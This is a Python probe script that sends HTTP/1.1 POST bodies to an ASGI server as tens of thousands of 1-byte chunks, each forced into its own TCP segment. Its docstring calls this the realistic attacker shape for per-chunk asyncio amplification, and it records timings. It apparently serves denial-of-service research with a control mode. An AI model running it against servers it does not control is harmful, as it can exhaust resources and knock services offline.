#!/usr/bin/env python3
"""Probe an ASGI server with 1-byte chunked-TE POSTs.

Critical: forces TCP_NODELAY and *does not* coalesce wire writes so each
1-byte HTTP/1.1 chunk lands as its own TCP segment. This is the realistic
attacker shape that exposes per-chunk asyncio task-switch amplification.
"""
import argparse
import socket
import time
import sys


def build_chunked_request(host: str, port: int, n: int) -> bytes:
    head = (
        f"POST /upload HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii")
    one_chunk = b"1\r\nA\r\n"
    body = one_chunk * n
    trailer = b"0\r\n\r\n"
    return head, body, trailer


def run_one(host: str, port: int, n: int, drain_every: int = 65536,
            timeout: float = 600.0, no_split: bool = False) -> dict:
    head, body, trailer = build_chunked_request(host, port, n)
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    # Make the kernel send buffer tiny so writes flush eagerly.
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
    except OSError:
        pass
    sock.settimeout(timeout)
    start = time.perf_counter()
    sock.sendall(head)
    chunk_size = 6  # "1\r\nA\r\n"
    sent_chunks = 0
    pos = 0
    total_body = len(body)
    if no_split:
        # send entire body in one go (control case)
        sock.sendall(body)
        sent_chunks = n
    else:
        while pos < total_body:
            end = pos + chunk_size
            sock.send(body[pos:end])
            pos = end
            sent_chunks += 1
            if sent_chunks % drain_every == 0:
                try:
                    sock.setblocking(False)
                    while True:
                        try:
                            d = sock.recv(4096)
                            if not d:
                                break
                        except (BlockingIOError, OSError):
                            break
                finally:
                    sock.setblocking(True)
    sock.sendall(trailer)
    send_done = time.perf_counter()
    sock.settimeout(timeout)
    buf = bytearray()
    while True:
        try:
            d = sock.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf.extend(d)
        if b"\r\n\r\n" in buf and len(buf) > 200:
            try:
                head_end = buf.index(b"\r\n\r\n")
                head_str = buf[:head_end].decode("latin1")
                cl = None
                for line in head_str.split("\r\n"):
                    if line.lower().startswith("content-length:"):
                        cl = int(line.split(":", 1)[1].strip())
                        break
                if cl is not None and len(buf) >= head_end + 4 + cl:
                    break
            except Exception:
                pass
    end_t = time.perf_counter()
    sock.close()
    status_line = buf.split(b"\r\n", 1)[0].decode("latin1", "replace") if buf else "<no-resp>"
    return {
        "n": n,
        "send_wall_s": send_done - start,
        "total_wall_s": end_t - start,
        "status": status_line,
        "resp_bytes": len(buf),
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="server")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--sizes", default="50000,100000,250000")
    ap.add_argument("--drain-every", type=int, default=65536)
    ap.add_argument("--label", default="unnamed")
    ap.add_argument("--no-split", action="store_true",
                    help="send body in one syscall (control)")
    args = ap.parse_args()

    sizes = [int(x) for x in args.sizes.split(",") if x.strip()]
    print(f"# label={args.label} host={args.host} port={args.port} no_split={args.no_split}", flush=True)
    print(f"# n\ttotal_wall_s\tsend_wall_s\tstatus\tresp_bytes", flush=True)
    for n in sizes:
        try:
            r = run_one(args.host, args.port, n, drain_every=args.drain_every,
                        no_split=args.no_split)
            print(f"{r['n']}\t{r['total_wall_s']:.3f}\t{r['send_wall_s']:.3f}\t{r['status']}\t{r['resp_bytes']}", flush=True)
        except Exception as e:
            print(f"{n}\tERROR\t{type(e).__name__}: {e}", flush=True)


if __name__ == "__main__":
    main()
